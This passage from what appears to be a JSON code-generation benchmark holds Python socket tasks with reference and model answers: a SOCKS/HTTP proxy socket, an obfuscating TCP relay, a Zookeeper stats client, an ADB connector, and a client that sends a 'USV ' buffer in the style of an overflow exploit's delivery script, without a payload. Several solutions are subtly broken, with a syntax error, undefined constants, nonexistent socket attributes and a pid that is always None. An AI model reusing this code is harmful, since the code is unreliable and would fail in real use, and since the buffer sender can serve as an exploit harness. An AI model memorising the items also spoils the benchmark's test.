0x5A:\n                error = SOCKS4_ERRORS.get(status, \"Unknown error\")\n                raise SOCKS4Error(\"{0:#04x}: {1}\".format(status, error))\n\n            self.proxy_sockname = (socket.inet_ntoa(resp[4:]),\n                                   struct.unpack(\">H\", resp[2:4])[0])\n            if remote_resolve:\n                self.proxy_peername = socket.inet_ntoa(addr_bytes), dest_port\n            else:\n                self.proxy_peername = dest_addr, dest_port\n        finally:\n            reader.close()\n            writer.close()\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through an HTTP server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        addr = dest_addr if rdns else socket.gethostbyname(dest_addr)\n\n        http_headers = [\n            (b\"CONNECT \" + addr.encode(\"idna\") + b\":\" +\n             str(dest_port).encode() + b\" HTTP/1.1\"),\n            b\"Host: \" + dest_addr.encode(\"idna\")\n        ]\n\n        if username and password:\n            http_headers.append(b\"Proxy-Authorization: basic \" +\n                                b64encode(username + b\":\" + password))\n\n        http_headers.append(b\"\\r\\n\")\n\n        self.sendall(b\"\\r\\n\".join(http_headers))\n\n        fobj = self.makefile()\n        status_line = fobj.readline()\n        fobj.close()\n\n        if not status_line:\n            raise GeneralProxyError(\"Connection closed unexpectedly\")\n\n        try:\n            proto, status_code, status_msg = status_line.split(\" \", 2)\n        except ValueError:\n            raise GeneralProxyError(\"HTTP proxy server sent invalid response\")\n\n        if not proto.startswith(\"HTTP/\"):\n            raise GeneralProxyError(\n                \"Proxy server does not appear to be an HTTP proxy\")\n\n        try:\n            status_code = int(status_code)\n        except ValueError:\n            raise HTTPError(\n                \"HTTP proxy server did not return a valid HTTP status\")\n\n        if status_code != 200:\n            error = \"{0}: {1}\".format(status_code, status_msg)\n            raise HTTPError(error)\n\n        self.proxy_sockname = (b\"0.0.0.0\", 0)\n        self.proxy_peername = addr, dest_port\n\n    _proxy_negotiators = {\n        SOCKS4: _negotiate_SOCKS4,\n        SOCKS5: _negotiate_SOCKS5,\n        HTTP: _negotiate_HTTP\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport struct\nimport random\n\nclass socksocket(socket.socket):\n    default_proxy = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs):\n        super().__init__(family, type, proto, *args, **kwargs)\n        self.proxy = None\n        self._proxyconn = None\n        self.proxy_sockname = None\n        self.proxy_peername = None\n        self._timeout = self.gettimeout()\n\n    def set_proxy(self, proxy_type, addr, port, rdns=True, username=None, password=None):\n        self.proxy = (proxy_type, addr, port, rdns, username, password)\n\n    def connect(self, dest_pair):\n        dest_addr, dest_port = dest_pair\n        if not self.proxy:\n            return super().connect((dest_addr, dest_port))\n        \n        proxy_type, addr, port, rdns, username, password = self.proxy\n        if proxy_type == socket.PROXY_TYPE_SOCKS4:\n            self._negotiate_SOCKS4(dest_addr, dest_port)\n        elif proxy_type == socket.PROXY_TYPE_SOCKS5:\n            self._negotiate_SOCKS5(dest_addr, dest_port)\n        elif proxy_type == socket.PROXY_TYPE_HTTP:\n            self._negotiate_HTTP(dest_addr, dest_port)\n        else:\n            raise socket.error(\"Unsupported proxy type\")\n\n    def _readall(self, file, count):\n        data = b''\n        while len(data) < count:\n            chunk = file.read(count - len(data))\n            if not chunk:\n                raise socket.error(\"Connection closed unexpectedly\")\n            data += chunk\n        return data\n\n    def _proxy_addr(self):\n        proxy_type, addr, port, rdns, username, password = self.proxy or self.default_proxy\n        return (addr, port)\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        proxy_type, addr, port, rdns, username, password = self.proxy or self.default_proxy\n        \n        try:\n            self._proxyconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._proxyconn.settimeout(self._timeout)\n            self._proxyconn.connect((addr, port))\n        except socket.error as e:\n            raise socket.error(f\"Failed to connect to SOCKS4 proxy: {e}\")\n\n        try:\n            ip = socket.inet_aton(socket.gethostbyname(dest_addr))\n        except socket.error:\n            raise socket.error(\"Invalid destination address\")\n\n        req = struct.pack(\"!BBH\", 0x04, 0x01, dest_port) + ip\n        if username:\n            req += username.encode() + b'\\x00'\n        req += b'\\x00'\n\n        self._proxyconn.sendall(req)\n\n        res = self._readall(self._proxyconn.makefile(), 8)\n        status = res[1]\n        if status != 0x5A:\n            self._proxyconn.close()\n            error_msg = {\n                0x5B: \"Request rejected or failed\",\n                0x5C: \"Request failed because client is not running identd\",\n                0x5D: \"Request failed because client's identd could not confirm the user ID\"\n            }.get(status, f\"Unknown SOCKS4 status code: {status}\")\n            raise socket.error(error_msg)\n\n        self._proxyconn.setblocking(False)\n        self.setblocking(False)\n        self.dup2(self._proxyconn.fileno(), self.fileno())\n        self.proxy_sockname = self._proxyconn.getsockname()\n        self.proxy_peername = (dest_addr, dest_port)\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        proxy_type, addr, port, rdns, username, password = self.proxy or self.default_proxy\n        \n        try:\n            self._proxyconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._proxyconn.settimeout(self._timeout)\n            self._proxyconn.connect((addr, port))\n        except socket.error as e:\n            raise socket.error(f\"Failed to connect to SOCKS5 proxy: {e}\")\n\n        auth_methods = [0x00]  # No authentication\n        if username and password:\n            auth_methods.insert(0, 0x02)  # Username/password\n\n        self._proxyconn.sendall(struct.pack(\"!BB\", 0x05, len(auth_methods)) + bytes(auth_methods))\n\n        res = self._readall(self._proxyconn.makefile(), 2)\n        ver, method = struct.unpack(\"!BB\", res)\n        if ver != 0x05:\n            raise socket.error(\"SOCKS5 proxy responded with invalid version\")\n        if method == 0x02:\n            if not username or not password:\n                raise socket.error(\"Authentication required but no credentials provided\")\n            self._proxyconn.sendall(struct.pack(\"!BB\", 0x01, len(username)) + username.encode())\n            self._proxyconn.sendall(struct.pack(\"!B\", len(password)) + password.encode())\n\n            res = self._readall(self._proxyconn.makefile(), 2)\n            ver, status = struct.unpack(\"!BB\", res)\n            if status != 0x00:\n                raise socket.error(\"SOCKS5 proxy authentication failed\")\n        elif method != 0x00:\n            raise socket.error(\"No acceptable authentication method found\")\n\n        host_bytes = b''\n        if rdns:\n            host_bytes = dest_addr.encode()\n            atype = 0x03  # Domain name\n        else:\n            try:\n                host_bytes = socket.inet_aton(dest_addr)\n                atype = 0x01  # IPv4\n            except socket.error:\n                try:\n                    host_bytes = socket.inet_pton(socket.AF_INET6, dest_addr)\n                    atype = 0x04  # IPv6\n                except socket.error:\n                    raise socket.error(\"Invalid address\")\n\n        req = struct.pack(\"!BBB\", 0x05, 0x01, 0x00)  # VER, CMD, RSV\n        req += struct.pack(\"B\", atype)  # AType\n        if atype == 0x03:\n            req += struct.pack(\"B\", len(host_bytes))  # Length of domain name\n        req += host_bytes\n        req += struct.pack(\"!H\", dest_port)\n\n        self._proxyconn.sendall(req)\n\n        res = self._readall(self._proxyconn.makefile(), 4)\n        ver, rep, rsv = struct.unpack(\"!BBB\", res[:3])\n        atype = res[3]\n\n        if ver != 0x05:\n            raise socket.error(\"SOCKS5 proxy responded with invalid version after connection request\")\n\n        if rep != 0x00:\n            error_msg = {\n                0x01: \"General SOCKS server failure\",\n                0x02: \"Connection not allowed by ruleset\",\n                0x03: \"Network unreachable\",\n                0x04: \"Host unreachable\",\n                0x05: \"Connection refused\",\n                0x06: \"TTL expired\",\n                0x07: \"Command not supported\",\n                0x08: \"Address type not supported\"\n            }.get(rep, f\"Unknown SOCKS5 error code: {rep}\")\n            raise socket.error(error_msg)\n\n        if atype == 0x01:\n            res = self._readall(self._proxyconn.makefile(), 4)\n        elif atype == 0x04:\n            res = self._readall(self._proxyconn.makefile(), 16)\n        else:\n            raise socket.error(\"Unsupported address type in SOCKS5 response\")\n\n        port_data = self._readall(self._proxyconn.makefile(), 2)\n        bind_port = struct.unpack(\"!H\", port_data)[0]\n\n        self._proxyconn.setblocking(False)\n        self.setblocking(False)\n        self.dup2(self._proxyconn.fileno(), self.fileno())\n        self.proxy_sockname = self._proxyconn.getsockname()\n        self.proxy_peername = (dest_addr, dest_port)\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        proxy_type, addr, port, rdns, username, password = self.proxy or self.default_proxy\n        \n        try:\n            self._proxyconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self._proxyconn.settimeout(self._timeout)\n            self._proxyconn.connect((addr, port))\n        except socket.error as e:\n            raise socket.error(f\"Failed to connect to HTTP proxy: {e}\")\n\n        headers = []\n        headers.append(f\"CONNECT {dest_addr}:{dest_port} HTTP/1.1\")\n        if username and password:\n            import base64\n            auth = base64.b64encode(f\"{username}:{password}\".encode()).decode()\n            headers.append(f\"Proxy-Authorization: Basic {auth}\")\n        headers.append(\"Host: {}:{}\\r\\n\".format(dest_addr, dest_port))\n\n        self._proxyconn.sendall(\"\\r\\n\".join(headers).encode() + b\"\\r\\n\\r\\n\")\n\n        response = b\"\"\n        while b\"\\r\\n\\r\\n\" not in response:\n            data = self._proxyconn.recv(4096)\n            if not data:\n                break\n            response += data\n\n        if not data:\n            raise socket.error(\"HTTP proxy closed connection before response\")\n\n        lines = response.split(b\"\\r\\n\")\n        status_line = lines[0].split()\n        if len(status_line) < 2:\n            raise socket.error(\"Invalid HTTP proxy response\")\n        status_code = status_line[1].decode()\n\n        if status_code != \"200\":\n            raise socket.error(f\"HTTP proxy returned non-200 status code: {status_code}\")\n\n        self._proxyconn.setblocking(False)\n        self.setblocking(False)\n        self.dup2(self._proxyconn.fileno(), self.fileno())\n        self.proxy_sockname = self._proxyconn.getsockname()\n        self.proxy_peername = (dest_addr, dest_port)"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local socket and a remote socket, handling encryption, obfuscation, and protocol-specific operations.\n\nClass Description: The TCPRelayHandler class is responsible for managing the bidirectional communication between a local client and a remote server. It handles socket creation, connection establishment, data encryption/decryption, obfuscation, and protocol-specific operations. The class uses event-driven programming to manage socket events efficiently.\n\nAttributes:\n\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to their handler instances\n- _loop: [object] - Event loop instance for managing socket events\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating if this is a local handler\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption/decryption handler\n- _client_address: [tuple] - Client address (IP, port)\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _local_sock_fd: [int] - Local socket file descriptor\n- _remote_sock_fd: [int] - Remote socket file descriptor\n- _remote_address: [tuple] - Remote server address (IP, port)\n- _data_to_write_to_remote: [list] - Buffer for data to be sent to remote\n\nMethods:\n\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> [None] - Initializes the handler with server references, sockets, and configuration\n- _create_remote_socket(ip, port) -> [socket.socket] - Creates and configures a remote socket\n- _handle_dns_resolved(result, error) -> [None] - Handles DNS resolution result\n- _write_to_sock(data, sock) -> [bytes/None] - Writes data to specified socket\n- _on_local_read() -> [None] - Handles incoming data from local socket\n- _on_remote_read() -> [None] - Handles incoming data from remote socket\n- _on_remote_write() -> [None] - Handles write events for remote socket\n- handle_event(sock, fd, event) -> [bool] - Processes socket events\n- destroy() -> [None] - Cleans up resources and closes sockets",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport common\nimport obfs\nimport encrypt\nimport eventloop\nimport lru_cache\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._create_encryptor(config)\n        self._client_address = local_sock.getpeername()[:2]\n        self._update_tcp_mss(local_sock)\n        self._obfs = obfs.obfs(config['obfs'])\n        self._protocol = obfs.obfs(config['protocol'])\n        self._setup_server_info()\n        local_sock.setblocking(False)\n        self._local_sock_fd = local_sock.fileno()\n        fd_to_handlers[self._local_sock_fd] = self\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n\n    def _create_remote_socket(self, ip, port):\n        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        remote_sock = socket.socket(af, socktype, proto)\n        remote_sock.setblocking(False)\n        remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        self._remote_sock = remote_sock\n        self._remote_sock_fd = remote_sock.fileno()\n        self._fd_to_handlers[self._remote_sock_fd] = self\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            self.destroy()\n            return\n        if result:\n            ip = result[1]\n            if ip:\n                try:\n                    remote_sock = self._create_remote_socket(ip, self._remote_address[1])\n                    remote_sock.connect((ip, self._remote_address[1]))\n                    self._loop.add(remote_sock, eventloop.POLL_ERR | eventloop.POLL_OUT, self._server)\n                    self._stage = STAGE_CONNECTING\n                except Exception as e:\n                    self.destroy()\n\n    def _write_to_sock(self, data, sock):\n        try:\n            if sock == self._remote_sock:\n                self._update_activity(len(data))\n                sent = sock.send(data)\n                if sent < len(data):\n                    return data[sent:]\n            return None\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                self.destroy()\n            return data\n\n    def _on_local_read(self):\n        try:\n            data = self._local_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                if self._encryptor is not None:\n                    data = self._protocol.client_pre_encrypt(data)\n                    data = self._encryptor.encrypt(data)\n                    data = self._obfs.client_encode(data)\n            self._write_to_sock(data, self._remote_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_read(self):\n        try:\n            data = self._remote_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                obfs_decode = self._obfs.client_decode(data)\n                data = self._encryptor.decrypt(obfs_decode[0])\n                data = self._protocol.client_post_decrypt(data)\n            self._write_to_sock(data, self._local_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_write(self):\n        self._stage = STAGE_STREAM\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._data_to_write_to_remote = []\n            remaining = self._write_to_sock(data, self._remote_sock)\n            if remaining is not None:\n                self._data_to_write_to_remote.append(remaining)\n\n    def handle_event(self, sock, fd, event):\n        if fd == self._remote_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_remote_read()\n            elif event & eventloop.POLL_OUT:\n                self._on_remote_write()\n        elif fd == self._local_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_local_read()\n        return True\n\n    def destroy(self):\n        if self._remote_sock:\n            self._loop.removefd(self._remote_sock_fd)\n            del self._fd_to_handlers[self._remote_sock_fd]\n            self._remote_sock.close()\n        if self._local_sock:\n            self._loop.removefd(self._local_sock_fd)\n            del self._fd_to_handlers[self._local_sock_fd]\n            self._local_sock.close()\n        self._server.remove_handler(self)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport logging\n\nclass TCPRelayHandler:\n    STAGE_INIT = 0\n    STAGE_DNS = 1\n    STAGE_CONNECTING = 2\n    STAGE_STREAM = 3\n\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = self.STAGE_INIT\n        self._encryptor = None\n        self._client_address = local_sock.getpeername()\n        self._obfs = None\n        self._protocol = None\n        self._local_sock_fd = local_sock.fileno()\n        self._remote_sock = None\n        self._remote_sock_fd = None\n        self._remote_address = None\n        self._data_to_write_to_remote = []\n\n        fd_to_handlers[self._local_sock_fd] = self\n        loop.add(self._local_sock_fd, self.on_local_read)\n\n    def _create_remote_socket(self, ip, port):\n        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        remote_sock.setblocking(False)\n        try:\n            remote_sock.connect((ip, port))\n        except BlockingIOError:\n            pass\n        self._remote_sock = remote_sock\n        self._remote_sock_fd = remote_sock.fileno()\n        self._fd_to_handlers[self._remote_sock_fd] = self\n        self._loop.add(self._remote_sock_fd, self.on_remote_read)\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            logging.error(f\"DNS resolution failed: {error}\")\n            self.destroy()\n            return\n        ip = result[0]\n        self._remote_address = (ip, self._config['server_port'])\n        self._create_remote_socket(ip, self._config['server_port'])\n        self._stage = self.STAGE_CONNECTING\n\n    def _write_to_sock(self, data, sock):\n        try:\n            return sock.send(data)\n        except Exception as e:\n            logging.error(f\"Write error: {e}\")\n            self.destroy()\n            return None\n\n    def on_local_read(self):\n        data = self._local_sock.recv(65535)\n        if not data:\n            self.destroy()\n            return\n        if self._stage == self.STAGE_STREAM:\n            encrypted = self._encryptor.encrypt(data)\n            obfuscated = self._obfs.server_encode(encrypted)\n            self._data_to_write_to_remote.append(obfuscated)\n            self._loop.modify(self._remote_sock_fd, self.on_remote_write)\n        else:\n            logging.warning(\"Data received before connection is fully established\")\n\n    def on_remote_read(self):\n        data = self._remote_sock.recv(65535)\n        if not data:\n            self.destroy()\n            return\n        decrypted = self._encryptor.decrypt(data)\n        deobfuscated = self._obfs.server_decode(decrypted)\n        self._local_sock.send(deobfuscated)\n\n    def on_remote_write(self):\n        while self._data_to_write_to_remote:\n            data = self._data_to_write_to_remote.pop(0)\n            written = self._write_to_sock(data, self._remote_sock)\n            if written != len(data):\n                if written:\n                    self._data_to_write_to_remote.insert(0, data[written:])\n                break\n        if not self._data_to_write_to_remote:\n            self._loop.remove(self._remote_sock_fd, self.on_remote_write)\n\n    def handle_event(self, sock, fd, event):\n        if sock == self._local_sock:\n            self.on_local_read()\n        elif sock == self._remote_sock:\n            if event & self._loop.READ:\n                self.on_remote_read()\n            if event & self._loop.WRITE:\n                self.on_remote_write()\n\n    def destroy(self):\n        if self._local_sock:\n            self._loop.remove(self._local_sock_fd, self.on_local_read)\n            self._local_sock.close()\n            del self._local_sock\n        if self._remote_sock:\n            self._loop.remove(self._remote_sock_fd, self.on_remote_read)\n            self._remote_sock.close()\n            del self._remote_sock\n        if self._local_sock_fd in self._fd_to_handlers:\n            del self._fd_to_handlers[self._local_sock_fd]\n        if hasattr(self, '_remote_sock_fd') and self._remote_sock_fd in self._fd_to_handlers:\n            del self._fd_to_handlers[self._remote_sock_fd]\n        self._server.remove_handler(self)"
  },
  {
    "Task_id": 326,
    "Instruction": "Task Description: Create a Python class that acts as a TCP client to interact with a Zookeeper server, retrieve statistics, and parse them into a structured format.\n\nClass Description: The ZookeeperTCPClient class provides functionality to connect to a Zookeeper server via TCP (either IPv4 or Unix socket), send commands, receive statistics, and parse them into a dictionary format while handling connection errors gracefully.\n\nAttributes: \n[No explicit attributes are defined in the class, as it's primarily method-based]\n\nMethods:\n\nMethod1: get_raw_stats(host, port) -> str - \nEstablishes a TCP connection to the specified Zookeeper server (either via IPv4 or Unix socket), sends the 'mntr' command, and returns the raw statistics data as a string.\nInput:\n- host: str - The server hostname/IP address or Unix socket path\n- port: str/int - The server port number (None for Unix socket connections)\nOutput:\n- str - Raw statistics data received from the server\n\nMethod2: get_stats(host, port) -> dict - \nRetrieves raw statistics using get_raw_stats(), parses them into a structured dictionary format while ignoring certain predefined fields, and attempts to find maximum connection limit from process information.\nInput:\n- host: str - The server hostname/IP address or Unix socket path\n- port: str/int - The server port number (None for Unix socket connections)\nOutput:\n- dict - Parsed statistics with metric names as keys and their values as values",
    "Canonical_solution": "import socket\nimport re\n\nclass ZookeeperTCPClient:\n    def __init__(self):\n        pass\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n            sock.send('mntr\\n')\n            data = sock.recv(4096)\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n        finally:\n            sock.close()\n        return data\n\n    def get_stats(self, host, port):\n        ignored = ('zk_version', 'zk_server_state')\n        pid = None\n        stats = {}\n        data = self.get_raw_stats(host, port)\n\n        for line in data.splitlines():\n            pieces = line.split()\n            if pieces[0] in ignored:\n                continue\n            stats[pieces[0]] = pieces[1]\n\n        try:\n            cmdline = \"/proc/%s/cmdline\" % pid\n            f = open(cmdline, 'r')\n            m = re.search(\"-c\\x00(\\d+)\", f.readline())\n            if m is not None:\n                stats['limit_maxconn'] = m.group(1)\n            f.close()\n        except:\n            pass\n\n        return stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport subprocess\n\nclass ZookeeperTCPClient:\n    def get_raw_stats(self, host, port):\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n            sock.sendall(b'mntr')\n            data = b''\n            while True:\n                chunk = sock.recv(4096)\n                if not chunk:\n                    break\n                data += chunk\n            sock.close()\n            return data.decode('utf-8')\n        except (socket.error, UnicodeDecodeError) as e:\n            return \"\"\n\n    def get_stats(self, host, port):\n        raw_data = self.get_raw_stats(host, port)\n        stats = {}\n        ignore_fields = ['zk_followers', 'zk_synced_followers', 'zk_pending_syncs']\n        if raw_data:\n            for line in raw_data.strip().split('\\n'):\n                parts = line.split('\\t')\n                if len(parts) == 2 and parts[0] not in ignore_fields:\n                    stats[parts[0]] = parts[1]\n        try:\n            proc = subprocess.Popen(['ps', '-ef'], stdout=subprocess.PIPE)\n            output = proc.communicate()[0].decode()\n            for line in output.splitlines():\n                if 'maxcnxns' in line:\n                    parts = line.split()\n                    for part in parts:\n                        if part.startswith('maxcnxns='):\n                            stats['max_connections'] = part.split('=')[1]\n                            break\n                    break\n        except Exception:\n            pass\n        return stats"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- buffer: str - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Success: Prints \"Buffer Sent Successfully!\" upon completion\n- Failure: Prints \"Check your debugger\" if connection fails",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        client_socket.connect((host, port))\n        initial_data = client_socket.recv(1024)\n        if initial_data:\n            print(initial_data.decode('utf-8'))\n        message = f\"USV {buffer}\\r\\n\\r\\n\"\n        client_socket.sendall(message.encode('utf-8'))\n        print(\"Buffer Sent Successfully!\")\n    except (socket.timeout, ConnectionRefusedError, socket.gaierror) as e:\n        print(\"Check your debugger\")\n    finally:\n        try:\n            client_socket.close()\n        except:\n            pass"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a TCP client class for communicating with an Android device through an ADB bridge, handling connection management, data transmission, and error recovery.\n\nClass Description: AdbConnector - A class that establishes and maintains a TCP connection to an Android device via ADB bridge, providing methods for sending requests and receiving responses.\n\nAttributes:\n- adb_host: str - The host address where ADB is running (default: 'localhost')\n- socket: socket - The TCP socket object for communication\n- packet_buffer: bytes - Buffer for storing incomplete packets\n- _disposed: bool - Flag indicating whether the connection has been closed\n- adb_proc: Popen - Subprocess object for the ADB bridge process\n\nMethods:\n- __init__(adb_host: str = 'localhost') -> None - Initializes the ADB connector with the specified host\n- _relaunch_adb_bridge() -> None - Restarts the ADB bridge connection when needed\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends a request packet to the device\n- read_loop() -> None - Continuously reads and processes incoming data from the device\n- dispose(disposing: bool = True) -> None - Cleans up resources and closes the connection",
    "Canonical_solution": "from subprocess import Popen, run, PIPE, DEVNULL, STDOUT, TimeoutExpired, list2cmdline\nfrom socket import socket, AF_INET, SOCK_STREAM\nfrom functools import partial\nfrom typing import Optional\nfrom os.path import exists\nfrom re import search\n\nQCSUPER_TCP_PORT = 43555\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost'):\n        self.adb_host = adb_host\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        self.packet_buffer = b''\n        self._disposed = False\n\n    def _relaunch_adb_bridge(self):\n        if hasattr(self, 'adb_proc'):\n            self.adb_proc.terminate()\n        \n        run_safe([self.adb_exe, 'forward', 'tcp:' + str(QCSUPER_TCP_PORT), 'tcp:' + str(QCSUPER_TCP_PORT)], check = True,\n                stdout = DEVNULL, stdin = DEVNULL)\n        \n        self.adb_proc = Popen([self.adb_exe, 'exec-out' if self.can_use_exec_out else 'shell', self.su_command % (ANDROID_TMP_DIR + '/adb_bridge')],\n            stdin = DEVNULL, stdout = PIPE, stderr = STDOUT,\n            preexec_fn = (lambda: partial(drop_privileges, True)) if drop_privileges else None,\n            bufsize = 0, universal_newlines = True\n        )\n    \n        for line in self.adb_proc.stdout:\n            if 'Connection to Diag established' in line:\n                break\n            else:\n                warning('Unexpected adb_bridge output: ' + line)\n\n        self.socket = socket(AF_INET, SOCK_STREAM)\n\n        try:\n            self.socket.connect((self.adb_host, QCSUPER_TCP_PORT))\n        except Exception:\n            self.adb_proc.terminate()\n            error('Could not communicate with the adb_bridge through TCP')\n            exit()\n        \n        self.received_first_packet = False\n\n    def send_request(self, packet_type, packet_payload):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read and platform in ('cygwin', 'win32'):\n                    self._relaunch_adb_bridge()\n                    \n                    if not self.program_is_terminating:\n                        with self.shutdown_event:\n                            self.shutdown_event.notify()\n                    \n                    socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read:\n                    error('\\nThe connection to the adb bridge was closed, or ' +\n                        'preempted by another QCSuper instance')\n                    return\n                \n                self.packet_buffer += socket_read\n            \n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n                \n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload = raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n                \n                self.dispatch_received_diag_packet(unframed_message)\n\n    def dispose(self, disposing=True):\n        if not self._disposed:\n            if hasattr(self, 'adb_proc'):\n                self.adb_proc.terminate()\n            self._disposed = True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport subprocess\nimport struct\nfrom subprocess import Popen\nfrom threading import Thread\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost') -> None:\n        self.adb_host = adb_host\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.packet_buffer = b''\n        self._disposed = False\n        self.adb_proc: Popen = None\n        self._relaunch_adb_bridge()\n\n    def _relaunch_adb_bridge(self) -> None:\n        if self.adb_proc:\n            self.adb_proc.terminate()\n            self.adb_proc.wait()\n        self.adb_proc = subprocess.Popen(['adb', 'start-server'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        try:\n            self.socket.connect((self.adb_host, 5037))\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to connect to ADB bridge on {self.adb_host}:5037\") from e\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        if self._disposed:\n            raise RuntimeError(\"Cannot send request on disposed AdbConnector\")\n        packet_length = len(packet_payload)\n        header = struct.pack('>I', packet_length + 4)\n        packet_type_data = struct.pack('>I', packet_type)\n        try:\n            self.socket.sendall(header + packet_type_data + packet_payload)\n        except socket.error as e:\n            self._relaunch_adb_bridge()\n            self.socket.sendall(header + packet_type_data + packet_payload)\n\n    def read_loop(self) -> None:\n        while not self._disposed:\n            try:\n                data = self.socket.recv(4096)\n                if not data:\n                    break\n                self.packet_buffer += data\n         